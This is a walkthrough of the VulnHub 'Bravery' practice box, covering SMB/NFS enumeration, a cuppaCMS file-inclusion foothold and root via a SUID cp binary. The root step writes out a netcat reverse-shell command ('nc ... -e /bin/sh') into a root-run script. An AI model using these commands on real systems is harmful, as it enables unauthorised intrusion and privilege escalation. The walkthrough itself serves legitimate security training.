---
description: >-
  Bravery[1] is a Linux machine made by Donovan. The box was designed for OSCP
  practice, and the original version of the machine was used for a CTF.
---

# Bravery

## Enumeration:

I really like to leave all the initial recon to `nmapAutomator`

```
$ nmapAutomator.sh digitalworld.local All
```

The initial ports shown are crucial. Set special attention to  `139/tcp  open  netbios-ssn ` , `445/tcp microsoft-ds` and `2049/tcp nfs` they will prove quite useful.

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3306/tcp open  mysql
8080/tcp open  http-proxy

```

### WEB enum

While nmap automator finish let's dive a bit on the web ports...

![](<../../.gitbook/assets/image (8).png>)

![](<../../.gitbook/assets/image (9).png>)

`ffuf` proved more useful against the **8080 **port:

```bash
private                 [Status: 301, Size: 185, Words: 6, Lines: 8]
public                  [Status: 301, Size: 185, Words: 6, Lines: 8]
robots.txt              [Status: 200, Size: 103, Words: 6, Lines: 6]

```

Nevertheless public doesn't show anymore info neither public, we let `ffuf` run against these directories looking for` .php` or` .txt` files

![](<../../.gitbook/assets/image (10).png>)

on the port \*80\* we can found the `/uploads` directory and after exploring a bit we can found the following `note.txt` at `/uploads/files/internal/department/procurement/sara/note.txt`  

![](<../../.gitbook/assets/image (11).png>)

cuppaCMS is a content manager system with some lousy vulnerabilities and this information could be of help later...

![](<../../.gitbook/assets/image (12).png>)

### SMB enum

Lets enumerate the SMB service

```bash
nmap -p 139,445 digitalworld.local
nmap -p 139,445 -sV -Pn digitalworld.local
```

![We can confirm there's a SMB instance running on the target machine](<../../.gitbook/assets/image (5).png>)

Then we tried to enumerate the shares:

```bash
smbclient -NL ////digitalworld.local
```

![List of shares available ](<../../.gitbook/assets/image (7).png>)

The `anonymous `share is useless. Although we gain a lot of social intelligence like issues within the dev team... what about checking the mount points since the port 2029 is open on the target?

```bash
showmount -e digitalworld.local
```

![](<../../.gitbook/assets/image (13).png>)

So we have two shares `anonymous` , `secured` and a mount point `/var/nfsshare`

{% hint style="info" %}
The mount point`/var/nfsshare` is quite common since, perhaps, it's the defacto naming convention for nfs shares at least in CentOS \[2]. 
{% endhint %}

Let's try to mount the nfs share. If you're using ParrotOS like me you might need to install `nfs-common` first:

```
sudo apt-get install nfs-common
```

And then...

```
mkdir /tmp/nfsshare
sudo mount digitalworld.local:var/nfsshare /tmp/nfsshare
```

![](<../../.gitbook/assets/image (15).png>)

reviewing the file's content and considering that we still have the `secured` share to check the continuation may be related to it.

![](<../../.gitbook/assets/image (16).png>)

 So let's dive in the `secured` share:

```
mkdir /tmp/secured
sudo mount //digitalworld.local/secured /tmp/secured -o username=david,password=qwertyuioplkjhgfdsazxcvbnm
```

![](<../../.gitbook/assets/image (17).png>)

So we are now aware of the `genevieve` folder which may have escaped to our wordlists...

#### Genevieve site

We found a "Corporate test page"...

![The Genevieve test page...](<../../.gitbook/assets/image (18).png>)

![](<../../.gitbook/assets/image (19).png>)

A quick exploration reviewing the site source reveals the location of `cuppaCMS`...

![](<../../.gitbook/assets/image (22).png>)

And it's vulnerable to the Remote/Local file inclusion vulnerability we found earlier:

![](<../../.gitbook/assets/image (23).png>)

## Foothold

A quick reverse shell created on our attacking machine and made accessible using python's simple server gave us our foothoold:

![](<../../.gitbook/assets/image (32).png>)

![](<../../.gitbook/assets/image (30).png>)

![](<../../.gitbook/assets/image (34).png>)

![](<../../.gitbook/assets/image (33).png>)

## Escalation

The standard cmd to gain a more friendly prompt:

```
python -c "import pty; pty.spawn('/bin/sh')"
```

Reviewing a bit the folder structure we found a `maintenance.sh` script that seems interesting on `/var/www/`...

![](<../../.gitbook/assets/image (37).png>)

If we could modify the contents of maintenance.sh we might spawn a root terminal but since it's a root owned file we can't modify it directly... Let's search for some bins with wierd permissions assigned

```
find / -perm -u=s -type f 2>/dev/null
```

This find cmd will return all binaries with the SUID bit set according to GTFObins: 

`If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.`

![The cp binary has the SUID bit set...](<../../.gitbook/assets/image (39).png>)

And perhaps we can abuse cp quite easily\[3]...

![](<../../.gitbook/assets/image (41).png>)

```
echo "nc -nv 10.10.10.5 5555 -e /bin/sh" | /usr/bin/cp /dev/stdin ./maintenance.sh
```

![](<../../.gitbook/assets/image (42).png>)

![](<../../.gitbook/assets/image (43).png>)

Ans we have rooted the box :smiley: ...

Even there's a `proof.txt` file laying there...

![](<../../.gitbook/assets/image (44).png>)

## Conclusions

1. Enumerate always. Improving my enum game on SMB and nfsshare mount points in order to correctly find the foothold was key.
2. Most of the time you don't need to exactly know how to execute a cmd but know your Google-fu :zany_face: 



## References

\[1] Digitalworl.local: Bravery [https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/)

\[2] NFS Server and Client Installation on CentOS 7 - [https://www.howtoforge.com/nfs-server-and-client-on-centos-7](https://www.howtoforge.com/nfs-server-and-client-on-centos-7)

\[3] ../cp [https://gtfobins.github.io/gtfobins/cp/#suid](https://gtfobins.github.io/gtfobins/cp/#suid)
